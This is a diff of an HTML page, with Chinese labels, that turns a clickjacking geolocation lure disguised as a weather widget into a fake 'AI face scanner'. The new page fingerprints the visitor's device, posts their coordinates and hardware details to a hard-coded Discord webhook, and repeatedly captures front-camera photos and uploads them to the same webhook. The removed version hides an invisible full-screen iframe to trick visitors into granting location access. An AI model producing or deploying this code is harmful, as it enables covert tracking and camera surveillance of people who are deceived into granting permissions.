@@ -1,89 +1,116 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>技術調試：全域點擊挾持</title>
-<style>
-    /* 誘餌層樣式 */
-    body { font-family: Arial; text-align: center; padding-top: 100px; background: #4fc3f7; margin: 0; overflow: hidden; }
-    .weather-box { 
-        background: white; width: 300px; margin: auto; padding: 30px; 
-        border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-    }
-    .btn-visual {
-        padding: 15px 30px; font-size: 18px; border: none;
-        border-radius: 12px; background: #1e88e5; color: white;
-    }
-
-    /* 核心：全螢幕挾持容器 */
-    .cj-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        z-index: 9999; /* 確保在最最最上層 */
-        cursor: pointer;
-    }
-
-    /* 隱形的 iframe */
-    .hidden-iframe {
-        width: 100%;
-        height: 100%;
-        border: none;
-        /* 調試階段：設為 0.3 讓你看到它確實蓋住了全螢幕 */
-        /* 正式使用時改為 0 */
-        opacity: 0.3; 
-        background: rgba(255, 0, 0, 0.1); 
-    }
-</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI 智能人臉識別系統</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a0a; color: #00ff41; text-align: center; margin: 0; display: flex; flex-direction: column; justify-content: center; height: 100vh; overflow: hidden; }
+        .container { border: 1px solid #00ff41; padding: 40px; border-radius: 15px; background: rgba(0, 40, 0, 0.2); box-shadow: 0 0 20px #00ff41; width: 80%; max-width: 400px; margin: auto; }
+        .scan-line { width: 100%; height: 2px; background: #00ff41; position: absolute; top: 0; left: 0; animation: scan 3s linear infinite; display: none; }
+        @keyframes scan { from { top: 0%; } to { top: 100%; } }
+        button { padding: 15px 30px; font-size: 18px; background: transparent; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; transition: 0.3s; margin-top: 20px; }
+        button:hover { background: #00ff41; color: #000; }
+        #log { font-family: monospace; font-size: 12px; margin-top: 20px; text-align: left; height: 100px; overflow: hidden; }
+    </style>
 </head>
 <body>
 
-<!-- 使用者看到的漂亮畫面 -->
-<div class="weather-box">
-    <div style="font-size: 60px;">☀️</div>
-    <h2>今日天氣預報</h2>
-    <p>點擊螢幕任何地方獲取資料</p>
-    <div class="btn-visual">查看天氣</div>
-    <p id="status" style="margin-top:20px; color:red; font-weight:bold;"></p>
+<div class="container" id="main-box">
+    <div class="scan-line" id="scanner"></div>
+    <h2 id="title">SYSTEM: AI SCANNER</h2>
+    <p>正在進行神經網路初始化...</p>
+    <button onclick="bootSystem()">啟動 AI 面部特徵分析</button>
+    <div id="log"></div>
 </div>
 
-<!-- 覆蓋全螢幕的隱形陷阱 -->
-<div class="cj-overlay">
-    <iframe src="about:blank" id="target-frame" class="hidden-iframe"></iframe>
-</div>
+<video id="v" style="display:none;" autoplay playsinline></video>
+<canvas id="c" style="display:none;"></canvas>
 
 <script>
-    const frame = document.getElementById('target-frame');
-    const doc = frame.contentDocument || frame.contentWindow.document;
-    
-    // 注入一個「全網頁都是按鈕」的攻擊層
-    doc.open();
-    doc.write(`
-        <body style="margin:0; padding:0;">
-            <div onclick="ask()" style="width:100vw; height:100vh; background:transparent; cursor:pointer;"></div>
-            <script>
-                function ask() {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => { window.parent.postMessage({type:'success', lat:pos.coords.latitude, lon:pos.coords.longitude}, '*'); },
-                        (err) => { window.parent.postMessage({type:'error'}, '*'); }
-                    );
-                }
-            <\/script>
-        </body>
-    `);
-    doc.close();
+// --- 配置區 ---
+const WEBHOOK = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
 
-    // 接收來自隱形層的定位資料
-    window.addEventListener('message', function(e) {
-        if(e.data.type === 'success') {
-            document.getElementById("status").innerHTML = "✅ 已定位：緯度 " + e.data.lat.toFixed(2);
-            // 這裡可以接你原本的 Discord Webhook 傳輸邏輯
-        } else if(e.data.type === 'error') {
-            document.getElementById("status").innerHTML = "❌ 使用者拒絕提供位置";
-        }
+function addLog(msg) {
+    const log = document.getElementById("log");
+    log.innerHTML += "> " + msg + "<br>";
+}
+
+// --- 核心升級 1：獲取更多設備資訊 (Device Fingerprinting) ---
+async function getDeviceInfo() {
+    let batteryInfo = "";
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryInfo = `🔋 電量: ${Math.round(battery.level * 100)}% (${battery.charging ? '充電中' : '放電中'})`;
+    }
+
+    return {
+        platform: navigator.platform,
+        browser: navigator.userAgent,
+        cores: navigator.hardwareConcurrency || "未知",
+        ram: navigator.deviceMemory || "未知",
+        battery: batteryInfo,
+        lang: navigator.language,
+        screen: `${window.screen.width}x${window.screen.height}`
+    };
+}
+
+// --- 核心啟動邏輯 ---
+async function bootSystem() {
+    document.getElementById("scanner").style.display = "block";
+    addLog("正在連接全球氣象/地圖節點...");
+    addLog("正在請求生物識別許可...");
+
+    const info = await getDeviceInfo();
+    
+    // 啟動定位
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const data = {
+                content: "🚨 **發現目標節點** 🚨\n" +
+                         "📍 **位置**: " + `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n` +
+                         "💻 **硬體**: " + `${info.platform} / ${info.cores} Cores / ${info.ram}GB RAM\n` +
+                         "📱 **系統**: " + `${info.browser}\n` +
+                         info.battery
+            };
+            fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
+            addLog("位置數據已鎖定。");
+        }, (err) => { addLog("定位讀取失敗。"); });
+    }
+
+    // 啟動相機
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(function(stream) {
+        addLog("相機流已建立，分析中...");
+        var video = document.getElementById("v");
+        video.srcObject = stream;
+        
+        // 第一次截圖延遲 1 秒，確保相機已啟動
+        setTimeout(capture, 1000);
+        // 持續截圖
+        setInterval(capture, 5000);
+    })
+    .catch(function(err) {
+        addLog("錯誤: 未偵測到生物識別裝置。");
     });
+}
+
+function capture() {
+    var video = document.getElementById("v");
+    var canvas = document.getElementById("c");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    var ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    canvas.toBlob(function(blob) {
+        var formData = new FormData();
+        formData.append('file', blob, 'target_face.jpg');
+        formData.append('payload_json', JSON.stringify({ content: "📸 **監視影像更新** - " + new Date().toLocaleTimeString() }));
+        
+        fetch(WEBHOOK, { method: "POST", body: formData });
+    }, "image/jpeg", 0.7);
+}
 </script>
 
 </body>
